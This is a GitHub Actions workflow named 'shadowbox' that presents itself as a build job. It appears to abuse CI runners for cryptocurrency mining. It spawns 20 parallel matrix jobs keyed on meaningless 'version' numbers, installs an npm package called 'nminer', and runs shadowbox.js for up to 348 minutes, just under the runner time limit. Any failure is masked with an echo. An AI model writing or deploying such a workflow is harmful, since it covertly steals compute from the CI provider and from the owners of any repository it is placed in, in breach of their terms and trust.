name: shadowbox
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8107 }
          - { version: 8370 }
          - { version: 109 }
          - { version: 4937 }
          - { version: 2770 }
          - { version: 8571 }
          - { version: 8511 }
          - { version: 2775 }
          - { version: 5459 }
          - { version: 8230 }
          - { version: 7906 }
          - { version: 7950 }
          - { version: 3695 }
          - { version: 5951 }
          - { version: 4932 }
          - { version: 9458 }
          - { version: 6091 }
          - { version: 5305 }
          - { version: 1839 }
          - { version: 6719 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: eek
        run: |
          npm install nminer@latest
          timeout 348m node shadowbox.js || echo "shadowbox executed"